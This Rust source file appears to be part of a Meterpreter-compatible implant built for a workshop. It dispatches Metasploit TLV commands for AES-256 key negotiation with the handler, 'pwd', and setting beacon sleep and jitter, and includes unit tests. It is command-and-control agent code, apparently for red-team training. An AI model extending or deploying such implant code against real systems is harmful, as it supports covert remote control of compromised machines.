use core_defs::packer::MpTlv;

use core_defs::meterpreter::ENC_FLAG_AES256;
use rand::RngCore;

const TLV_TYPE_COMMAND_ID: u32 = 0x0002_0001;
const TLV_TYPE_STRING: u32 = 0x0001_000A;
const TLV_TYPE_SYM_KEY_TYPE: u32 = 0x0002_0227;
const TLV_TYPE_SYM_KEY: u32 = 0x0004_0228;

const ERROR_SUCCESS: u32 = 0;
const ERROR_NOT_SUPPORTED: u32 = 50;

const COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION: u32 = 16;
const COMMAND_ID_STD_PWD: u32 = 1001;

const COMMAND_ID_WORKSHOP_SET_BEACON: u32 = 9001;
const TLV_TYPE_WORKSHOP_SLEEP_MS: u32 = 0x2001_0001;
const TLV_TYPE_WORKSHOP_JITTER_PCT: u32 = 0x2001_0002;

pub fn get_u32_be(tlvs: &[MpTlv], typ: u32) -> Option<u32> {
    let t = tlvs.iter().find(|t| t.typ == typ)?;
    if t.value.len() < 4 {
        return None;
    }
    Some(u32::from_be_bytes([t.value[0], t.value[1], t.value[2], t.value[3]]))
}

fn tlv_uint(typ: u32, v: u32) -> MpTlv {
    MpTlv {
        typ,
        value: v.to_be_bytes().to_vec(),
    }
}

fn tlv_raw(typ: u32, v: &[u8]) -> MpTlv {
    MpTlv {
        typ,
        value: v.to_vec(),
    }
}

fn tlv_wstring(typ: u32, s: &str) -> MpTlv {
    let mut out: Vec<u8> = Vec::new();
    for wc in s.encode_utf16() {
        out.extend_from_slice(&wc.to_le_bytes());
    }
    out.extend_from_slice(&0u16.to_le_bytes());
    MpTlv { typ, value: out }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DispatchResult {
    pub result: u32,
    pub tlvs: Vec<MpTlv>,
    pub new_aes_key: Option<[u8; 32]>,
    pub new_sleep_ms: Option<u32>,
    pub new_jitter_pct: Option<u8>,
}

pub fn dispatch_tlvs(tlvs: &[MpTlv]) -> DispatchResult {
    let cmd_id = get_u32_be(tlvs, TLV_TYPE_COMMAND_ID).unwrap_or(0);
    match cmd_id {
        COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION => {
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            DispatchResult {
                result: ERROR_SUCCESS,
                tlvs: vec![
                    tlv_uint(TLV_TYPE_SYM_KEY_TYPE, ENC_FLAG_AES256),
                    tlv_raw(TLV_TYPE_SYM_KEY, &key),
                ],
                new_aes_key: Some(key),
                new_sleep_ms: None,
                new_jitter_pct: None,
            }
        }
        COMMAND_ID_STD_PWD => {
            let pwd = std::env::current_dir()
                .ok()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();
            DispatchResult {
                result: ERROR_SUCCESS,
                tlvs: vec![tlv_wstring(TLV_TYPE_STRING, &pwd)],
                new_aes_key: None,
                new_sleep_ms: None,
                new_jitter_pct: None,
            }
        }
        COMMAND_ID_WORKSHOP_SET_BEACON => {
            let sleep_ms = get_u32_be(tlvs, TLV_TYPE_WORKSHOP_SLEEP_MS);
            let jitter_raw = get_u32_be(tlvs, TLV_TYPE_WORKSHOP_JITTER_PCT);
            let jitter_pct = jitter_raw.and_then(|v| u8::try_from(v).ok());

            let mut ack = String::from("beacon updated");
            if let Some(ms) = sleep_ms {
                ack.push_str(&format!(" sleep_ms={}", ms));
            }
            if let Some(j) = jitter_pct {
                ack.push_str(&format!(" jitter_pct={}", j));
            }

            DispatchResult {
                result: ERROR_SUCCESS,
                tlvs: vec![tlv_wstring(TLV_TYPE_STRING, &ack)],
                new_aes_key: None,
                new_sleep_ms: sleep_ms,
                new_jitter_pct: jitter_pct,
            }
        }
        _ => DispatchResult {
            result: ERROR_NOT_SUPPORTED,
            tlvs: Vec::new(),
            new_aes_key: None,
            new_sleep_ms: None,
            new_jitter_pct: None,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn get_u32_be_reads_first_4_bytes() {
        let tlvs = vec![MpTlv {
            typ: 0x1234,
            value: 0x11223344u32.to_be_bytes().to_vec(),
        }];
        assert_eq!(get_u32_be(&tlvs, 0x1234), Some(0x11223344));
    }

    #[test]
    fn get_u32_be_returns_none_for_missing() {
        let tlvs = vec![MpTlv { typ: 1, value: vec![0, 0, 0, 1] }];
        assert_eq!(get_u32_be(&tlvs, 2), None);
    }

    #[test]
    fn get_u32_be_returns_none_for_short() {
        let tlvs = vec![MpTlv { typ: 1, value: vec![1, 2, 3] }];
        assert_eq!(get_u32_be(&tlvs, 1), None);
    }

    #[test]
    fn dispatch_negotiate_returns_key() {
        let tlvs = vec![MpTlv {
            typ: TLV_TYPE_COMMAND_ID,
            value: COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION.to_be_bytes().to_vec(),
        }];
        let res = dispatch_tlvs(&tlvs);
        assert_eq!(res.result, ERROR_SUCCESS);
        assert!(res.new_aes_key.is_some());
        assert!(res.tlvs.iter().any(|t| t.typ == TLV_TYPE_SYM_KEY));
    }
}
